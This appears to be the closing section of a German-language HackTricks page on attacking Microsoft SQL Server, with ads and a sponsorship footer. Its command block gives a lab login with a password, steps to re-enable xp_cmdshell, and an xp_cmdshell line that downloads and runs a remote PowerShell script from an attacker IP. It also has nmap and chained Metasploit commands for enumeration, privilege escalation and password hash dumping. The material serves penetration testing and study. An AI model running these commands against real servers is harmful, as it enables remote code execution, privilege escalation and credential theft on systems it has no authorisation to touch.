* [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
* [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)

‚Äã

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Schwachstellen, damit Sie sie schneller beheben k√∂nnen. Intruder √ºberwacht Ihre Angriffsfl√§che, f√ºhrt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs √ºber Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## HackTricks Automatische Befehle
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications‚Äîwhich may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
